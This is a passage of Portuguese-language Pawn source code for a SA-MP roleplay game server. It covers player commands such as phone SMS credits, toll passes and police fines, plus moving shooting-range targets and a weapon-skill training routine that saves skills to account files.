			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][Prof] == POL_RODOVIARIO && !IsPlayerInRangeOfPoint(playerid, 1.0, 614.4798, -584.9612, 17.2266))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está no seu vestiário!");
			    return 1;
			}
			if(pInfo[playerid][fardado] == 1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já está fardado(a)!");
			    return 1;
			}
			pInfo[playerid][fardado] = 1;
			armasProf(playerid);
			SendClientMessage(playerid, COR_CEU, "Agora você está fardado(a) e devidamente equipado(a).");
		}
		return 1;
	}
	if(!strcmp(cmd, "/celular", true))
	{
		ShowPlayerDialog(playerid, D_CELLL, DIALOG_STYLE_LIST, "Celular", "\tCréditos SMS\n\tEnviar SMS", "OK", "Sair");
	    return 1;
	}
    if(!strcmp(cmd, "/setarsms", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarsms [ID] [SMS]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /setarsms [ID] [SMS]");
	        	return 1;
	        }
            new
				s_sms = strval(tmp)
			;
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			if(pInfo[id][Celular] == 0)
			{
		   		SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) não tem celular!");
		    	return 1;
			}
			format(gstring, sizeof(gstring), "Você setou %d sms para %s - SMS anterior %d", s_sms, PlayerName(id), pInfo[id][Celular_c]);
			SendClientMessage(playerid, 0x1E90FFAA, gstring);
			format(gstring, sizeof(gstring), "O(A) administrador(a) %s setou %d SMS pra você.", PlayerName(playerid), s_sms);
			SendClientMessage(id, 0x1E90FFAA, gstring);
			pInfo[id][Celular_c] = s_sms;

			format(gStr, sizeof(gStr), "%s recebeu %d SMS do(a) administrador(a) - %s", PlayerName(id), s_sms, PlayerName(playerid));
			log_setados_sms(gStr);
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
 	if(!strcmp(cmdtext, "/viafacil", true)) {
	    if(IsPlayerInRangeOfPoint(playerid, 2, 60.1402, -1533.1696, 5.2082)) {
		    new stringvfacil[] = "10 passagens - R$900\n20 passagens - R$1.900\n30 passagens - R$ 2.800\n50 passagens - R$4.700\n100 passagens - R$9.000,00";
		    ShowPlayerDialog(playerid, D_VIAFACIL, DIALOG_STYLE_LIST, "Via Fácil", stringvfacil, "Comprar", "Fechar");
	    } else SendClientMessage(playerid, 0xFF0000FF, "ERRO - Você não está no pedágio.");
	    return 1;
    }
    if(!strcmp(cmd, "/multar", true))
	{
        if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == EXERCITO || aInfo[playerid][Admin] == 1)
        {
        	if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para procurar um(a) jogador(a)!");
			    return 1;
			}
            tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /Multar [ID] [Quantia] [Motivo]");
	        	return 1;
	        }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
        	{
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /Multar [ID] [Quantia] [Motivo]");
	        	return 1;
	        }
            new
				grana = strval(tmp)
			;
			if(grana > 10000 || grana < 1)
			{
				return SendClientMessage(playerid, COR_ERRO, "Uma multa não pode exceder R$10.000 reais!");
			}
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
  			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Multar [ID] [Quantia] [Motivo]");
			  	return 1;
	    	}
			if(!IsPlayerConnected(id))
		   	{
		   		SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		    	return 1;
			}
			if(pInfo[id][Level] < 5)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não pode multar novatos!");
				return 1;
			}
   	     	if(playerid == id)
          	{
				SendClientMessage(playerid, COR_ERRO, "Você não pode multar você mesmo!");
				return 1;
          	}
          	if(GetDistanceBetweenPlayers(playerid, id) > 15)
     		{
             	SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
				return 1;
          	}
        	if(Multou[playerid] == 1)
       		{
           	  	SendClientMessage(playerid, COR_ERRO, "Aguarde 1 minuto para multar novamente!");
           	  	return 1;
      		}
      		if(Multou[playerid] > gettime())
			{
			    format(gStr, sizeof(gStr), "Aguarde %d segundos para poder multar um(a) jogador(a)!", Multou[playerid] - gettime());
			    SendClientMessage(playerid, COR_ERRO, gStr);
				return 1;
			}
	      	format(gstring, sizeof(gstring), "Você multou {FFFFFF}%s {1E90FF}em {009933}R$%d {1E90FF}reais, pelo motivo: {FFFFFF}%s.", PlayerName(id), grana, result);
	       	SendClientMessage(playerid, AZUL_WE, gstring);
	      	format(gstring, sizeof(gstring), "Você recebeu {009933}R$%d {1E90FF}reais como bônus pela multa.", grana/3);
	       	SendClientMessage(playerid, AZUL_WE, gstring);
	     	format(gstring, sizeof(gstring), "O(A) oficial {FFFFFF}%s {FFF000}lhe multou em {009933}R$%d {FFF000}reais, pelo motivo: {FFFFFF}%s.", PlayerName(playerid), grana, result);
      		SendClientMessage(id, COR_AMARELO, gstring);
 			sGivePlayerCash(id, -grana);
 			sGivePlayerCash(playerid, grana/3);
 			Multou[playerid] = gettime() + 60;
			format(gstring, sizeof(gstring), "* %s multou %s em R$%s reais, pelo motivo: %s", PlayerName(playerid), PlayerName(id), grana, result);
			LogSetGrana(gstring);
		}
	  	else
		{
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	return SendClientMessage(playerid, 0xFF0000AA, "Comando inexistente, use: {FFFFFF}/Ajuda {FF0000}ou {FFFFFF}/Comandos");
}

stock IsShout(text[])
{
    for(new i, j = strlen(text)-1; i < j; i ++ )
    {
        if(('A' <= text[i] <= 'Z') && ('A' <= text[i+1] <= 'Z'))
            return true;
    }
    return false;
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ) {
	if(hittype == BULLET_HIT_TYPE_OBJECT) {
    	for(new i = 0; i < 12; i++) {
        	if(pInfo[playerid][Treinando] != true) return true;
            if(hitid != alvosammu[i]) continue;
            PontosTiro[playerid]++;
            print("Acertou um!");
            break;
         }
	}
	return true;
}

forward ObjetosAmmu();
public ObjetosAmmu()
{
	/*if(ObjetosAmmuOn3 == true)
	{
		ObjetosAmmuOn3 = false;
	}*/
	if(ObjetosAmmuOn2 == true)
	{
	    ObjetosAmmuOn2 = false;
	}
	ObjetosAmmuOn = true;
	MoveObject(alvosammu[0], 283.36710, -129.32350, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	MoveObject(alvosammu[1], 283.17880, -138.06670, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	MoveObject(alvosammu[2], 283.96829, -135.65050, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	MoveObject(alvosammu[3], 284.63190, -132.70654, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	ObjetosAmmuCheck2 = SetTimer("ObjetosAmmu2",1000,false);
	return 1;
}

forward ObjetosAmmu2();
public ObjetosAmmu2()
{
	ObjetosAmmuOn = false;
	ObjetosAmmuOn2 = true;
	MoveObject(alvosammu[0], 283.36713, -138.06361, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	MoveObject(alvosammu[1], 283.17877, -129.39748, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	MoveObject(alvosammu[2], 283.96829, -132.71671, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	MoveObject(alvosammu[3], 284.62924, -135.64587, 1004.35718, 5.0,  0.00000, 90.00000, 0.00000);
	ObjetosAmmuCheck = SetTimer("ObjetosAmmu",1000,false);
	return 1;
}

/*forward ObjetosAmmu3();
public ObjetosAmmu3()
{
	ObjetosAmmuOn2 = false;
	ObjetosAmmuOn3 = true;
	MoveObject(alvosammu[0], 285.28461, -128.12105, 1004.05548, 5.0,  0.00000, 0.00000, 180.00000);//xalvo1
	MoveObject(alvosammu[1], 285.32828, -139.12512, 1004.05548, 5.0,  0.00000, 0.00000, 180.00000);//xalvo2
	MoveObject(alvosammu[2], 285.40903, -130.48186, 1004.05548, 5.0,  0.00000, 0.00000, 180.00000);//xalvo3
	MoveObject(alvosammu[3], 285.37347, -137.22452, 1004.05548, 5.0,  0.00000, 0.00000, 180.00000);//xalvo4
	MoveObject(alvosammu[4], 279.97461, -130.80569, 1004.05548, 5.0,  0.00000, 0.00000, 90.00000);//yalvo1
	MoveObject(alvosammu[5], 280.03217, -133.44516, 1004.05548, 5.0,  0.00000, 0.00000, 90.00000);//yalvo2
	MoveObject(alvosammu[6], 279.92120, -136.28398, 1004.05548, 5.0,  0.00000, 0.00000, 90.00000);//yalvo3
	MoveObject(alvosammu[7], 280.83975, -132.16853, 1004.05548, 5.0,  0.00000, 0.00000, 90.00000);//yalvo4
	MoveObject(alvosammu[8], 287.25980, -130.19150, 1004.05658, 5.0,  0.00000, 0.00000, 90.00000);//zalvo1
	MoveObject(alvosammu[9], 287.15988, -138.79228, 1004.05658, 5.0,  0.00000, 0.00000, 90.00000);//zalvo2
	MoveObject(alvosammu[10], 287.31949, -134.27153, 1004.05658, 5.0,  0.00000, 0.00000, 90.00000);//zalvo3
	MoveObject(alvosammu[11], 284.66742, -134.99237, 1004.05658, 5.0,  0.00000, 0.00000, 90.00000);//zalvo4
	ObjetosAmmuCheck = SetTimer("ObjetosAmmu",1000,false);
	return 1;
}*/

forward FimTreino(playerid);
public FimTreino(playerid)
{
	new SkillValue;
	pInfo[playerid][Treinando] = false;
	SetPlayerHealth(playerid,100);
	SetPlayerPos(playerid,313.62061, -139.51691, 1003.65670);
	ResetPlayerWeapons(playerid);
	PontosTiro[playerid] = 0;
	if(tPistol[playerid] == true)
	{
	    if(PontosTiro[playerid] < 175) return SendClientMessage(playerid,COR_ERRO,"Você não adquiriu experiência por não acertar o mínimo necessário!");
	    SendClientMessage(playerid,AZUL_WE,"Parabéns, você acertou o número necessário de alvos e adquiriu mais 100 pontos de habilidades em pistolas!");
	    SkillValue = pInfo[playerid][Pistolas]+100;
		SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, SkillValue);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, SkillValue);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, SkillValue);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SkPistol", SkillValue);
		WE_SaveFile();
		tPistol[playerid] = false;
		return 1;
    }
	else if(tShotgun[playerid] == true)
	{
	    if(PontosTiro[playerid] < 100) return SendClientMessage(playerid,COR_ERRO,"Você não adquiriu experiência por não acertar o mínimo necessário!");
	    SendClientMessage(playerid,AZUL_WE,"Parabéns, você acertou o número necessário de alvos e adquiriu mais 100 pontos de habilidades em shotguns!");
	    SkillValue = pInfo[playerid][Shotguns]+100;
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, SkillValue);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, SkillValue);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SPAS12_SHOTGUN, SkillValue);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SkShotgun", SkillValue);
		WE_SaveFile();
	    tShotgun[playerid] = false;
	    return 1;
    }
 	else if(tMicro[playerid] == true)
	{
	    if(PontosTiro[playerid] < 300) return SendClientMessage(playerid,COR_ERRO,"Você não adquiriu experiência por não acertar o mínimo necessário!");
	    SendClientMessage(playerid,AZUL_WE,"Parabéns, você acertou o número necessário de alvos e adquiriu mais 100 pontos de habilidades em micro SMGs!");
	    SkillValue = pInfo[playerid][Micros]+100;
		SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, SkillValue);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SkMicro", SkillValue);
		WE_SaveFile();
	    tMicro[playerid] = false;
	    return 1;
    }
 	else if(tSMG[playerid] == true)
	{
	    if(PontosTiro[playerid] < 300) return SendClientMessage(playerid,COR_ERRO,"Você não adquiriu experiência por não acertar o mínimo necessário!");
	    SendClientMessage(playerid,AZUL_WE,"Parabéns, você acertou o número necessário de alvos e adquiriu mais 100 pontos de habilidades em SMGs!");
	    SkillValue = pInfo[playerid][SubMG]+100;
		SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, SkillValue);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SkMP5", SkillValue);
		WE_SaveFile();
	    tSMG[playerid] = false;
	    return 1;
    }
	else if(tRifle[playerid] == true)
	{
	    if(PontosTiro[playerid] < 300) return SendClientMessage(playerid,COR_ERRO,"Você não adquiriu experiência por não acertar o mínimo necessário!");
	    SendClientMessage(playerid,AZUL_WE,"Parabéns, você acertou o número necessário de alvos e adquiriu mais 100 pontos de habilidades em rifles!");
	    SkillValue = pInfo[playerid][Rifles]+100;
		SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, SkillValue);
		SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, SkillValue);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SkRifle", SkillValue);
		WE_SaveFile();
	    tRifle[playerid] = false;
	    return 1;
    }
 	else if(tSniper[playerid] == true)
	{
	    if(PontosTiro[playerid] < 50) return SendClientMessage(playerid,COR_ERRO,"Você não adquiriu experiência por não acertar o mínimo necessário!");
	    SendClientMessage(playerid,AZUL_WE,"Parabéns, você acertou o número necessário de alvos e adquiriu mais 100 pontos de habilidades em sniper!");
	    SkillValue = pInfo[playerid][Sniper]+100;
		SetPlayerSkillLevel(playerid, WEAPONSKILL_SNIPERRIFLE, SkillValue);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SkSniper", SkillValue);
		WE_SaveFile();
	    tSniper[playerid] = false;
	    return 1;
    }
	return 1;
}
